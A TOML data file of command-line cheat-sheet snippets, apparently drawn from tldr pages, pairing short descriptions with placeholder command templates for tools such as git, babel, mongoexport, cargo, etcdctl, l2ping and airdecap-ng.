  description = "Clone an existing repository only fetching the 10 most recent commits on the default branch (useful to save time)"
  command = "git clone --depth <10> <remote_repository_location>"
  output = ""

[[snippets]]
  description = "Clone an existing repository only fetching a specific branch"
  command = "git clone --branch <name> --single-branch <remote_repository_location>"
  output = ""

[[snippets]]
  description = "Clone an existing repository using a specific SSH command"
  command = "git clone --config core.sshCommand=""<ssh -i path/to/private_ssh_key>"" <remote_repository_location>"
  output = ""

[[snippets]]
  description = "Compile an executable"
  command = "gnatmake <source_file1.adb source_file2.adb ...>"
  output = ""

[[snippets]]
  description = "Set a custom executable name"
  command = "gnatmake -o <executable_name> <source_file.adb>"
  output = ""

[[snippets]]
  description = "[f]orce recompilation"
  command = "gnatmake -f <source_file.adb>"
  output = ""

[[snippets]]
  description = "Sort a file and keep the first line at the top"
  command = "keep-header <path/to/file> -- sort"
  output = ""

[[snippets]]
  description = "Output first line directly to `stdout`, passing the remainder of the file through the specified command"
  command = "keep-header <path/to/file> -- <command>"
  output = ""

[[snippets]]
  description = "Read from `stdin`, sorting all except the first line"
  command = "cat <path/to/file> | keep-header -- <command>"
  output = ""

[[snippets]]
  description = "Grep a file, keeping the first line regardless of the search pattern"
  command = "keep-header <path/to/file> -- grep <pattern>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr nm"
  output = ""

[[snippets]]
  description = "Ping a Bluetooth device"
  command = "sudo l2ping <mac_address>"
  output = ""

[[snippets]]
  description = "Reverse ping a Bluetooth device"
  command = "sudo l2ping -r <mac_address>"
  output = ""

[[snippets]]
  description = "Ping a Bluetooth device from a specified interface"
  command = "sudo l2ping -i <hci0> <mac_address>"
  output = ""

[[snippets]]
  description = "Ping Bluetooth device with a specified sized data package"
  command = "sudo l2ping -s <byte_count> <mac_address>"
  output = ""

[[snippets]]
  description = "Ping flood a Bluetooth device"
  command = "sudo l2ping -f <mac_address>"
  output = ""

[[snippets]]
  description = "Ping a Bluetooth device a specified amount of times"
  command = "sudo l2ping -c <amount> <mac_address>"
  output = ""

[[snippets]]
  description = "Ping a Bluetooth device with a specified delay between requests"
  command = "sudo l2ping -d <seconds> <mac_address>"
  output = ""

[[snippets]]
  description = "Read a Berkeley YUV file from the specified input file, convert it to a PPM image and store it in the specified output file"
  command = "eyuvtoppm --width <width> --height <height> <path/to/input_file.eyuv> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "ptpython"
  output = ""

[[snippets]]
  description = "Execute a specific Python file"
  command = "ptpython <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Execute a specific Python file and start a REPL"
  command = "ptpython -i <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Open the menu"
  command = "F2"
  output = ""

[[snippets]]
  description = "Open the history page"
  command = "F3"
  output = ""

[[snippets]]
  description = "Toggle paste mode"
  command = "F6"
  output = ""

[[snippets]]
  description = "Quit"
  command = "<Ctrl> + D"
  output = ""

[[snippets]]
  description = "Compute the difference, i.e. the peak signal-to-noise ratio (PSNR) between two images"
  command = "pnmpsnr <path/to/file1.pnm> <path/to/file2.pnm>"
  output = ""

[[snippets]]
  description = "Compare the color components rather than the luminance and chrominance components of the images"
  command = "pnmpsnr <path/to/file1.pnm> <path/to/file2.pnm> -rgb"
  output = ""

[[snippets]]
  description = "Run in comparison mode, i.e. only output `nomatch` or `match` depending on whether the computing PSNR exceeds `n` or not"
  command = "pnmpsnr <path/to/file1.pnm> <path/to/file2.pnm> -target <n>"
  output = ""

[[snippets]]
  description = "Run in comparison mode and compare the individual image components, i.e. Y, Cb, and Cr, to the corresponding thresholds"
  command = "pnmpsnr <path/to/file1.pnm> <path/to/file2.pnm> -target1 <threshold_Y> -target2 <threshold_Cb> -target3 <threshold_Cr>"
  output = ""

[[snippets]]
  description = "Run in comparison mode and compare the individual image components, i.e. red, green, and blue to the corresponding thresholds"
  command = "pnmpsnr <path/to/file1.pnm> <path/to/file2.pnm> -rgb -target1 <threshold_red> -target2 <threshold_green> -target3 <threshold_blue>"
  output = ""

[[snippets]]
  description = "Produce machine-readable output"
  command = "pnmpsnr <path/to/file1.pnm> <path/to/file2.pnm> -machine"
  output = ""

[[snippets]]
  description = "Start Polybar (the bar name is optional if only one bar is defined in the config)"
  command = "polybar <bar_name>"
  output = ""

[[snippets]]
  description = "Start Polybar with the specified config"
  command = "polybar --config=<path/to/config.ini> <bar_name>"
  output = ""

[[snippets]]
  description = "Start Polybar and reload the bar when the configuration file is modified"
  command = "polybar --reload <bar_name>"
  output = ""

[[snippets]]
  description = "Create a new version containing all the changes in the current checkout; user will be prompted for a comment"
  command = "fossil commit"
  output = ""

[[snippets]]
  description = "Create a new version containing all the changes in the current checkout, using the specified comment"
  command = "fossil commit --comment ""<comment>"""
  output = ""

[[snippets]]
  description = "Create a new version containing all the changes in the current checkout with a comment read from a specific file"
  command = "fossil commit --message-file <path/to/commit_message_file>"
  output = ""

[[snippets]]
  description = "Create a new version containing changes from the specified files; user will be prompted for a comment"
  command = "fossil commit <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Create a new Vue project interactively"
  command = "vue create <project_name>"
  output = ""

[[snippets]]
  description = "Create a new project with web UI"
  command = "vue ui"
  output = ""

[[snippets]]
  description = "Start a runit service as the current user"
  command = "runsv <path/to/service>"
  output = ""

[[snippets]]
  description = "Start a runit service as root"
  command = "sudo runsv <path/to/service>"
  output = ""

[[snippets]]
  description = "Transpile a specified input file and output to `stdout`"
  command = "babel <path/to/file>"
  output = ""

[[snippets]]
  description = "Transpile a specified input file and output to a specific file"
  command = "babel <path/to/input_file> --out-file <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Transpile the input file every time it is changed"
  command = "babel <path/to/input_file> --watch"
  output = ""

[[snippets]]
  description = "Transpile a whole directory of files"
  command = "babel <path/to/input_directory>"
  output = ""

[[snippets]]
  description = "Ignore specified comma-separated files in a directory"
  command = "babel <path/to/input_directory> --ignore <ignored_file1,ignored_file2,...>"
  output = ""

[[snippets]]
  description = "Transpile and output as minified JavaScript"
  command = "babel <path/to/input_file> --minified"
  output = ""

[[snippets]]
  description = "Choose a set of presets for output formatting"
  command = "babel <path/to/input_file> --presets <preset1,preset2,...>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "babel --help"
  output = ""

[[snippets]]
  description = "Incorporate changes from the named commits into the current branch"
  command = "dolt merge <branch_name>"
  output = ""

[[snippets]]
  description = "Incorporate changes from the named commits into the current branch without updating the commit history"
  command = "dolt merge --squash <branch_name>"
  output = ""

[[snippets]]
  description = "Merge a branch and create a merge commit even when the merge resolves as a fast-forward"
  command = "dolt merge --no-ff <branch_name>"
  output = ""

[[snippets]]
  description = "Merge a branch and create a merge commit with a specific commit message"
  command = "dolt merge --no-ff -m ""<message>"" <branch_name>"
  output = ""

[[snippets]]
  description = "Abort the current conflict resolution process"
  command = "dolt merge --abort"
  output = ""

[[snippets]]
  description = "Specify the target OVA file"
  command = "VBoxManage export --output <path/to/filename.ova>"
  output = ""

[[snippets]]
  description = "Export in OVF 0.9 legacy mode"
  command = "VBoxManage export --legacy09"
  output = ""

[[snippets]]
  description = "Export in OVF (0.9|1.0|2.0) format"
  command = "VBoxManage export --<ovf09|ovf10|ovf20>"
  output = ""

[[snippets]]
  description = "Create manifest of the exported files"
  command = "VBoxManage export --manifest"
  output = ""

[[snippets]]
  description = "Specify a description of the VM"
  command = "VBoxManage export --description ""<vm_description>"""
  output = ""

[[snippets]]
  description = "Initialize a new local repository"
  command = "hub init"
  output = ""

[[snippets]]
  description = "Remove finished tasks and clear logs"
  command = "pueue clean"
  output = ""

[[snippets]]
  description = "Only clean commands that finished successfully"
  command = "pueue clean --successful-only"
  output = ""

[[snippets]]
  description = "Remove wireless headers from an open network capture file and use the access point's MAC address to filter"
  command = "airdecap-ng -b <ap_mac> <path/to/capture.cap>"
  output = ""

[[snippets]]
  description = "Decrypt a [w]EP encrypted capture file using the key in hex format"
  command = "airdecap-ng -w <hex_key> <path/to/capture.cap>"
  output = ""

[[snippets]]
  description = "Decrypt a WPA/WPA2 encrypted capture file using the access point's [e]ssid and [p]assword"
  command = "airdecap-ng -e <essid> -p <password> <path/to/capture.cap>"
  output = ""

[[snippets]]
  description = "Decrypt a WPA/WPA2 encrypted capture file preserving the headers using the access point's [e]ssid and [p]assword"
  command = "airdecap-ng -l -e <essid> -p <password> <path/to/capture.cap>"
  output = ""

[[snippets]]
  description = "Decrypt a WPA/WPA2 encrypted capture file using the access point's [e]ssid and [p]assword and use its MAC address to filter"
  command = "airdecap-ng -b <ap_mac> -e <essid> -p <password> <path/to/capture.cap>"
  output = ""

[[snippets]]
  description = "Upload the current (local-only) repository to your GitHub account as public"
  command = "hub create"
  output = ""

[[snippets]]
  description = "Create a private repository and open the new repository in a web browser"
  command = "hub create --private --browse"
  output = ""

[[snippets]]
  description = "Generate a UPC image for the specified product type, manufacturer code, and product code"
  command = "pbmupc <product_type> <manufacturer_code> <product_code> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Use an alternative style that does not display the checksum"
  command = "pbmupc -s2 <product_type> <manufacturer_code> <product_code> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Convert a PBM image file to YBM"
  command = "pbmtoybm <path/to/input_file.pbm> > <path/to/output_file.ybm>"
  output = ""

[[snippets]]
  description = "Create a new project using one of the default templates"
  command = "vue init <webpack|webpack-simple|browserify|browserify-simple|simple> <project_name>"
  output = ""

[[snippets]]
  description = "Create a new project using a local template"
  command = "vue init <path/to/template_directory> <project_name>"
  output = ""

[[snippets]]
  description = "Create a new project using a template from GitHub"
  command = "vue init <username>/<repo> <project_name>"
  output = ""

[[snippets]]
  description = "Combine several graph layouts (that already have layout information)"
  command = "gvpack <path/to/layout1.gv> <path/to/layout2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Combine several graph layouts at the graph level, keeping graphs separate"
  command = "gvpack -g <path/to/layout1.gv> <path/to/layout2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Combine several graph layouts at the node level, ignoring clusters"
  command = "gvpack -n <path/to/layout1.gv> <path/to/layout2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Combine several graph layouts without packing"
  command = "gvpack -u <path/to/layout1.gv> <path/to/layout2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "gvpack -?"
  output = ""

[[snippets]]
  description = "Start `gpg-tui`"
  command = "gpg-tui"
  output = ""

[[snippets]]
  description = "Start `gpg-tui` with color and ASCII armored output"
  command = "gpg-tui --style <colored> --armor"
  output = ""

[[snippets]]
  description = "Quit `gpg-tui`"
  command = "q"
  output = ""

[[snippets]]
  description = "Interactively generate a new key"
  command = "g"
  output = ""

[[snippets]]
  description = "Export the selected key"
  command = "x"
  output = ""

[[snippets]]
  description = "Set the detail level for the selected key"
  command = "1|2|3"
  output = ""

[[snippets]]
  description = "Refresh `gpg-tui`"
  command = "r"
  output = ""

[[snippets]]
  description = "Display help in `gpg-tui`"
  command = "?"
  output = ""

[[snippets]]
  description = "Create an AWS cost and usage report definition from a JSON file"
  command = "aws cur put-report-definition --report-definition file://<path/to/report_definition.json>"
  output = ""

[[snippets]]
  description = "List usage report definitions defined for the logged in account"
  command = "aws cur describe-report-definitions"
  output = ""

[[snippets]]
  description = "Delete a usage report definition"
  command = "aws cur --region <aws_region> delete-report-definition --report-name <report>"
  output = ""

[[snippets]]
  description = "Print all configurations"
  command = "az config get"
  output = ""

[[snippets]]
  description = "Print configurations for a specific section"
  command = "az config get <section_name>"
  output = ""

[[snippets]]
  description = "Set a configuration"
  command = "az config set <configuration_name>=<value>"
  output = ""

[[snippets]]
  description = "Unset a configuration"
  command = "az config unset <configuration_name>"
  output = ""

[[snippets]]
  description = "Find rows that have a certain string in column 1"
  command = "csvgrep -c <1> -m <string_to_match> <data.csv>"
  output = ""

[[snippets]]
  description = "Find rows in which columns 3 or 4 match a certain regular expression"
  command = "csvgrep -c <3,4> -r <regular_expression> <data.csv>"
  output = ""

[[snippets]]
  description = "Find rows in which the "name" column does NOT include the string "John Doe""
  command = "csvgrep -i -c <name> -m ""<John Doe>"" <data.csv>"
  output = ""

[[snippets]]
  description = "Set the maximum number of tasks allowed to run in parallel, in the default group"
  command = "pueue parallel <max_number_of_parallel_tasks>"
  output = ""

[[snippets]]
  description = "Set the maximum number of tasks allowed to run in parallel, in a specific group"
  command = "pueue parallel --group <group_name> <maximum_number_of_parallel_tasks>"
  output = ""

[[snippets]]
  description = "Initialize a new repository in the current directory"
  command = "hg init"
  output = ""

[[snippets]]
  description = "Initialize a new repository in the specified directory"
  command = "hg init <path/to/directory>"
  output = ""

[[snippets]]
  description = "Print all strings in a binary"
  command = "strings <path/to/file>"
  output = ""

[[snippets]]
  description = "Limit results to strings at least n characters long"
  command = "strings -n <n> <path/to/file>"
  output = ""

[[snippets]]
  description = "Prefix each result with its offset within the file"
  command = "strings -t d <path/to/file>"
  output = ""

[[snippets]]
  description = "Prefix each result with its offset within the file in hexadecimal"
  command = "strings -t x <path/to/file>"
  output = ""

[[snippets]]
  description = "Render a `png` image with a filename based on the input filename and output format (uppercase -O)"
  command = "sfdp -T <png> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `svg` image with the specified output filename (lowercase -o)"
  command = "sfdp -T <svg> -o <path/to/image.svg> <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render the output in `ps`, `pdf`, `svg`, `fig`, `png`, `gif`, `jpg`, `json`, or `dot` format"
  command = "sfdp -T <format> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `gif` image using `stdin` and `stdout`"
  command = "echo ""<digraph {this -> that} >"" | sfdp -T <gif> > <path/to/image.gif>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "sfdp -?"
  output = ""

[[snippets]]
  description = "Convert a PAM image file to an ICO file"
  command = "pamtowinicon <path/to/input_file.pam> > <path/to/output.ico>"
  output = ""

[[snippets]]
  description = "Encode images with resolutions smaller than t in the BMP format and all other images in the PNG format"
  command = "pamtowinicon -pngthreshold <t> <path/to/input_file.pam> > <path/to/output.ico>"
  output = ""

[[snippets]]
  description = "Make all pixels outside the non-opaque area black"
  command = "pamtowinicon -truetransparent <path/to/input_file.pam> > <path/to/output.ico>"
  output = ""

[[snippets]]
  description = "Fetch the latest changes from the default remote upstream repository (if set)"
  command = "dvc fetch"
  output = ""

[[snippets]]
  description = "Fetch changes from a specific remote upstream repository"
  command = "dvc fetch --remote <remote_name>"
  output = ""

[[snippets]]
  description = "Fetch the latest changes for a specific target/s"
  command = "dvc fetch <target/s>"
  output = ""

[[snippets]]
  description = "Fetch changes for all branch and tags"
  command = "dvc fetch --all-branches --all-tags"
  output = ""

[[snippets]]
  description = "Fetch changes for all commits"
  command = "dvc fetch --all-commits"
  output = ""

[[snippets]]
  description = "Export a collection to `stdout`, formatted as JSON"
  command = "mongoexport --uri=<connection_string> --collection=<collection_name>"
  output = ""

[[snippets]]
  description = "Export the documents in the specified collection that match a query to a JSON file"
  command = "mongoexport --db=<database_name> --collection=<collection_name> --query=""<query_object>"" --out=<path/to/file.json>"
  output = ""

[[snippets]]
  description = "Export documents as a JSON array instead of one object per line"
  command = "mongoexport --collection=<collection_name> --jsonArray"
  output = ""

[[snippets]]
  description = "Export documents to a CSV file"
  command = "mongoexport --collection=<collection_name> --type=<csv> --fields=""<field1,field2,...>"" --out=<path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Export documents that match the query in the specified file to a CSV file, omitting the list of field names on the first line"
  command = "mongoexport --collection=<collection_name> --type=<csv> --fields=""<field1,field2,...>"" --queryFile=<path/to/file> --noHeaderLine --out=<path/to/file.csv>"
  output = ""

[[snippets]]
  description = "Export documents to `stdout`, formatted as human-readable JSON"
  command = "mongoexport --uri=<mongodb_uri> --collection=<collection_name> --pretty"
  output = ""

[[snippets]]
  description = "Display help"
  command = "mongoexport --help"
  output = ""

[[snippets]]
  description = "Rename all files with a certain extension to a different extension"
  command = "mmv ""*<.old_extension>"" ""#1<.new_extension>"""
  output = ""

[[snippets]]
  description = "Copy `report6part4.txt` to `./french/rapport6partie4.txt` along with all similarly named files"
  command = "mmv -c ""<report*part*.txt>"" ""<./french/rapport#1partie#2.txt>"""
  output = ""

[[snippets]]
  description = "Append all `.txt` files into one file"
  command = "mmv -a ""<*.txt>"" ""<all.txt>"""
  output = ""

[[snippets]]
  description = "Convert dates in filenames from "M-D-Y" format to "D-M-Y" format"
  command = "mmv ""<[0-1][0-9]-[0-3][0-9]-[0-9][0-9][0-9][0-9].txt>"" ""<#3#4-#1#2-#5#6#7#8.txt>"""
  output = ""

[[snippets]]
  description = "Generate a PPM image as output that is `flashfactor` times brighter than the input PPM image"
  command = "ppmflash <flashfactor> <path/to/file.ppm> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "ppmflash -version"
  output = ""

[[snippets]]
  description = "Print the workspace members and resolved dependencies of the current package"
  command = "cargo metadata"
  output = ""

[[snippets]]
  description = "Print only the workspace members and do not fetch dependencies"
  command = "cargo metadata --no-deps"
  output = ""

[[snippets]]
  description = "Print metadata in a specific format based on the specified version"
  command = "cargo metadata --format-version <version>"
  output = ""

[[snippets]]
  description = "Print metadata with the `resolve` field including dependencies only for the given target triple (Note: the `packages` array will still include the dependencies for all targets)"
  command = "cargo metadata --filter-platform <target_triple>"
  output = ""

[[snippets]]
  description = "Update the changelog file and tag a release"
  command = "standard-version"
  output = ""

[[snippets]]
  description = "Tag a release without bumping the version"
  command = "standard-version --first-release"
  output = ""

[[snippets]]
  description = "Update the changelog and tag an alpha release"
  command = "standard-version --prerelease alpha"
  output = ""

[[snippets]]
  description = "Update the changelog and tag a specific release type"
  command = "standard-version --release-as <major|minor|patch>"
  output = ""

[[snippets]]
  description = "Tag a release, preventing hooks from being verified during the commit step"
  command = "standard-version --no-verify"
  output = ""

[[snippets]]
  description = "Tag a release committing all staged changes, not just files affected by `standard-version`"
  command = "standard-version --commit-all"
  output = ""

[[snippets]]
  description = "Update a specific changelog file and tag a release"
  command = "standard-version --infile <path/to/file.md>"
  output = ""

[[snippets]]
  description = "Display the release that would be performed without performing them"
  command = "standard-version --dry-run"
  output = ""

[[snippets]]
  description = "Launch the flowchart and diagram application"
  command = "calligraflow"
  output = ""

[[snippets]]
  description = "Open a specific file"
  command = "calligraflow <path/to/file>"
  output = ""

[[snippets]]
  description = "Display help or version"
  command = "calligraflow --<help|version>"
  output = ""

[[snippets]]
  description = "Open in the default system editor"
  command = "fc"
  output = ""

[[snippets]]
  description = "Specify an editor to open with"
  command = "fc -e <'emacs'>"
  output = ""

[[snippets]]
  description = "List recent commands from history"
  command = "fc -l"
  output = ""

[[snippets]]
  description = "List recent commands in reverse order"
  command = "fc -l -r"
  output = ""

[[snippets]]
  description = "List commands in a given interval"
  command = "fc '<416>' '<420>'"
  output = ""

[[snippets]]
  description = "Convert a PCX file to a PPM image"
  command = "pcxtoppm <path/to/file.pcx> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Use a predefined standard palette even if the PCX file provides one"
  command = "pcxtoppm -stdpalette <path/to/file.pcx> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Print information on the PCX header to `stdout`"
  command = "pcxtoppm -verbose <path/to/file.pcx> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Execute a Ruby script"
  command = "ruby <script.rb>"
  output = ""

[[snippets]]
  description = "Execute a single Ruby command in the command-line"
  command = "ruby -e <command>"
  output = ""

[[snippets]]
  description = "Check for syntax errors on a given Ruby script"
  command = "ruby -c <script.rb>"
  output = ""

[[snippets]]
  description = "Start the built-in HTTP server on port 8080 in the current directory"
  command = "ruby -run -e httpd"
  output = ""

[[snippets]]
  description = "Locally execute a Ruby binary without installing the required library it depends on"
  command = "ruby -I <path/to/library_folder> -r <library_require_name> <path/to/bin_folder/bin_name>"
  output = ""

[[snippets]]
  description = "Display Ruby version"
  command = "ruby -v"
  output = ""

[[snippets]]
  description = "Start Emacs and open a file"
  command = "emacs <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file at a specified line number"
  command = "emacs +<line_number> <path/to/file>"
  output = ""

[[snippets]]
  description = "Run an Emacs Lisp file as a script"
  command = "emacs --script <path/to/file.el>"
  output = ""

[[snippets]]
  description = "Start Emacs in console mode (without an X window)"
  command = "emacs --no-window-system"
  output = ""

[[snippets]]
  description = "Start an Emacs server in the background (accessible via `emacsclient`)"
  command = "emacs --daemon"
  output = ""

[[snippets]]
  description = "Stop a running Emacs server and all its instances, asking for confirmation on unsaved files"
  command = "emacsclient --eval '(save-buffers-kill-emacs)'"
  output = ""

[[snippets]]
  description = "Save a file in Emacs"
  command = "<Ctrl> + X, <Ctrl> + S"
  output = ""

[[snippets]]
  description = "Quit Emacs"
  command = "<Ctrl> + X, <Ctrl> + C"
  output = ""

[[snippets]]
  description = "Test random reads"
  command = "fio --filename=<path/to/file> --direct=1 --rw=randread --bs=4k --ioengine=libaio --iodepth=256 --runtime=120 --numjobs=4 --time_based --group_reporting --name=<job_name> --eta-newline=1 --readonly"
  output = ""

[[snippets]]
  description = "Test sequential reads"
  command = "fio --filename=<path/to/file> --direct=1 --rw=read --bs=4k --ioengine=libaio --iodepth=256 --runtime=120 --numjobs=4 --time_based --group_reporting --name=<job_name> --eta-newline=1 --readonly"
  output = ""

[[snippets]]
  description = "Test random read/write"
  command = "fio --filename=<path/to/file> --direct=1 --rw=randrw --bs=4k --ioengine=libaio --iodepth=256 --runtime=120 --numjobs=4 --time_based --group_reporting --name=<job_name> --eta-newline=1"
  output = ""

[[snippets]]
  description = "Test with parameters from a job file"
  command = "fio <path/to/job_file>"
  output = ""

[[snippets]]
  description = "Convert a specific job file to command-line options"
  command = "fio --showcmd <path/to/job_file>"
  output = ""

[[snippets]]
  description = "Initialize a new .NET project"
  command = "dotnet new <template_short_name>"
  output = ""

[[snippets]]
  description = "Restore NuGet packages"
  command = "dotnet restore"
  output = ""

[[snippets]]
  description = "Build and execute the .NET project in the current directory"
  command = "dotnet run"
  output = ""

[[snippets]]
  description = "Run a packaged dotnet application (only needs the runtime, the rest of the commands require the .NET Core SDK installed)"
  command = "dotnet <path/to/application.dll>"
  output = ""

[[snippets]]
  description = "Auto-format a file or entire directory"
  command = "black <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Format the [c]ode passed in as a string"
  command = "black -c ""<code>"""
  output = ""

[[snippets]]
  description = "Show whether a file or a directory would have changes made to them if they were to be formatted"
  command = "black --check <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Show changes that would be made to a file or a directory without performing them (dry-run)"
  command = "black --diff <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Auto-format a file or directory, emitting exclusively error messages to `stderr`"
  command = "black --quiet <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Auto-format a file or directory without replacing single quotes with double quotes (adoption helper, avoid using this for new projects)"
  command = "black --skip-string-normalization <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Test filename encoding conversion (don't actually change the filename)"
  command = "convmv -f <from_encoding> -t <to_encoding> <input_file>"
  output = ""

[[snippets]]
  description = "Convert filename encoding and rename the file to the new encoding"
  command = "convmv -f <from_encoding> -t <to_encoding> --notest <input_file>"
  output = ""

[[snippets]]
  description = "Delete personal repo on GitHub"
  command = "hub delete <repo>"
  output = ""

[[snippets]]
  description = "Show the current pinning data"
  command = "tlmgr pinning show"
  output = ""

[[snippets]]
  description = "Pin the matching the packages to the given repository"
  command = "tlmgr pinning add <repository> <package1 package2 ...>"
  output = ""

[[snippets]]
  description = "Remove any packages recorded in the pinning file matching the packages for the given repository"
  command = "tlmgr pinning remove <repository> <package1 package2 ...>"
  output = ""

[[snippets]]
  description = "Remove all pinning data for the given repository"
  command = "tlmgr pinning remove <repository> --all"
  output = ""

[[snippets]]
  description = "Construct the transitive reduction graph of one or more directed graphs"
  command = "tred <path/to/input1.gv> <path/to/input2.gv ...> > <path/to/output.gv>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "tred -?"
  output = ""

[[snippets]]
  description = "Compile a `.java` file"
  command = "javac <path/to/file.java>"
  output = ""

[[snippets]]
  description = "Compile several `.java` files"
  command = "javac <path/to/file1.java path/to/file2.java ...>"
  output = ""

[[snippets]]
  description = "Compile all `.java` files in current directory"
  command = "javac <*.java>"
  output = ""

[[snippets]]
  description = "Compile a `.java` file and place the resulting class file in a specific directory"
  command = "javac -d <path/to/directory> <path/to/file.java>"
  output = ""

[[snippets]]
  description = "Start a new game"
  command = "blockout2"
  output = ""

[[snippets]]
  description = "Navigate the current piece on a 2D plane"
  command = "<Up|Down|Left|Right arrow key>"
  output = ""

[[snippets]]
  description = "Rotate the piece on its axis"
  command = "<Q|W|E|A|S|D>"
  output = ""

[[snippets]]
  description = "Hard drop the current piece"
  command = "<Spacebar>"
  output = ""

[[snippets]]
  description = "Pause/unpause the game"
  command = "p"
  output = ""

[[snippets]]
  description = "Pretty print an HTML file"
  command = "tidy <path/to/file.html>"
  output = ""

[[snippets]]
  description = "Enable [i]ndentation, [w]rapping lines in 100, saving to `output.html`"
  command = "tidy --indent y --wrap 100 -output <path/to/output.html> <path/to/file.html>"
  output = ""

[[snippets]]
  description = "Modify an HTML file in-place using a configuration file"
  command = "tidy -config <path/to/configuration> -modify <path/to/file.html>"
  output = ""

[[snippets]]
  description = "Update dependencies in `Cargo.lock` to the latest possible version"
  command = "cargo update"
  output = ""

[[snippets]]
  description = "Display what would be updated, but don't actually write the lockfile"
  command = "cargo update --dry-run"
  output = ""

[[snippets]]
  description = "Update only the specified dependencies"
  command = "cargo update --package <dependency1> --package <dependency2> --package <dependency3>"
  output = ""

[[snippets]]
  description = "Set a specific dependency to a specific version"
  command = "cargo update --package <dependency> --precise <1.2.3>"
  output = ""

[[snippets]]
  description = "Download and install a package, specified by its import path"
  command = "go get <package_path>"
  output = ""

[[snippets]]
  description = "Compile and run a source file (it has to contain a `main` package)"
  command = "go run <file>.go"
  output = ""

[[snippets]]
  description = "Compile a source file into a named executable"
  command = "go build -o <executable> <file>.go"
  output = ""

[[snippets]]
  description = "Compile the package present in the current directory"
  command = "go build"
  output = ""

[[snippets]]
  description = "Execute all test cases of the current package (files have to end with `_test.go`)"
  command = "go test"
  output = ""

[[snippets]]
  description = "Compile and install the current package"
  command = "go install"
  output = ""

[[snippets]]
  description = "Initialize a new module in the current directory"
  command = "go mod init <module_name>"
  output = ""

[[snippets]]
  description = "List nodes including the total CPU and Memory resource requests and limits"
  command = "kube-capacity"
  output = ""

[[snippets]]
  description = "Include pods"
  command = "kube-capacity -p"
  output = ""

[[snippets]]
  description = "Include utilization"
  command = "kube-capacity -u"
  output = ""

[[snippets]]
  description = "Add a timestamp to the beginning of each line"
  command = "<command> | ts"
  output = ""

[[snippets]]
  description = "Add timestamps with microsecond precision"
  command = "<command> | ts ""<%b %d %H:%M:%.S>"""
  output = ""

[[snippets]]
  description = "Add [i]ncremental timestamps with microsecond precision, starting from zero"
  command = "<command> | ts -i ""<%H:%M:%.S>"""
  output = ""

[[snippets]]
  description = "Convert existing timestamps in a text file (eg. a log file) into [r]elative format"
  command = "cat <path/to/file> | ts -r"
  output = ""

[[snippets]]
  description = "Display the value associated with a specified key"
  command = "etcdctl get <my/key>"
  output = ""

[[snippets]]
  description = "Store a key-value pair"
  command = "etcdctl put <my/key> <my_value>"
  output = ""

[[snippets]]
  description = "Delete a key-value pair"
  command = "etcdctl del <my/key>"
  output = ""

[[snippets]]
  description = "Store a key-value pair, reading the value from a file"
  command = "etcdctl put <my/file> < <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Save a snapshot of the etcd keystore"
  command = "etcdctl snapshot save <path/to/snapshot.db>"
  output = ""

[[snippets]]
  description = "Restore a snapshot of an etcd keystore (restart the etcd server afterwards)"
  command = "etcdctl snapshot restore <path/to/snapshot.db>"
  output = ""

[[snippets]]
  description = "Add a user"
  command = "etcdctl user add <my_user>"
  output = ""

[[snippets]]
  description = "Watch a key for changes"
  command = "etcdctl watch <my/key>"
  output = ""

[[snippets]]
  description = "Produce a grayscale version of the specified PPM image"
  command = "ppmdist <path/to/input.ppm> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Use the specified method to map colors to graylevels"
  command = "ppmdist -<frequency|intensity> <path/to/input.ppm> > <path/to/output.pgm>"
  output = ""

[[snippets]]
  description = "Calculate the SHA1 checksum for one or more files"
  command = "sha1sum <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate and save the list of SHA1 checksums to a file"
  command = "sha1sum <path/to/file1 path/to/file2 ...> > <path/to/file.sha1>"
  output = ""

[[snippets]]
  description = "Calculate a SHA1 checksum from `stdin`"
  command = "<command> | sha1sum"
  output = ""

[[snippets]]
  description = "Read a file of SHA1 sums and filenames and verify all files have matching checksums"
  command = "sha1sum --check <path/to/file.sha1>"
  output = ""

[[snippets]]
  description = "Only show a message for missing files or when verification fails"
  command = "sha1sum --check --quiet <path/to/file.sha1>"
  output = ""

[[snippets]]
  description = "Only show a message when verification fails, ignoring missing files"
  command = "sha1sum --ignore-missing --check --quiet <path/to/file.sha1>"
  output = ""

[[snippets]]
  description = "Convert a PBM image to a X11 XBM file"
  command = "pbmtoxbm <path/to/input_file.pbm> > <path/to/output_file.xbm>"
  output = ""

[[snippets]]
  description = "Explicitly specify whether an X11 or X10 bitmap should be generated"
  command = "pbmtoxbm -<x11|x10> <path/to/input_file.pbm> > <path/to/output_file.xbm>"
  output = ""

[[snippets]]
  description = "Uninstall a TeX Live package"
  command = "sudo tlmgr remove <package>"
  output = ""

